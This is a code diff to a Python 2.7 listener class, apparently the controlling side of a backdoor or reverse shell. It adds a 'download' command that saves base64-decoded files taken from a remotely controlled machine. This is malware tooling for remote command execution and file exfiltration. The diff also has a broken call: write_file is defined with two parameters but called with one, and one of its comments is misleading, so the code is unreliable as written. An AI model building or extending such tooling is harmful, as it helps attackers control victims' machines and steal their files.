@@ -3,6 +3,7 @@
    Uses Python 2.7.16"""
 
 import optparse
+import base64
 import socket
 import json
 
@@ -57,11 +58,19 @@ class Listener:
         return self.reliable_receive()
 
 
+    def write_file(self, path, contents):
+        with open(path, 'wb') as file:
+            file.write(base64.b64decode(contents))          # re-encodes characters
+            return '[+] Download successful...'
+
+
     def run(self):
         while True:
             command = raw_input('>> ')
             command = command.split(' ')
             result = self.execute_remotely(command)
+            if command[0] == 'download':
+                result = self.write_file(result)
             print(result)
 
 
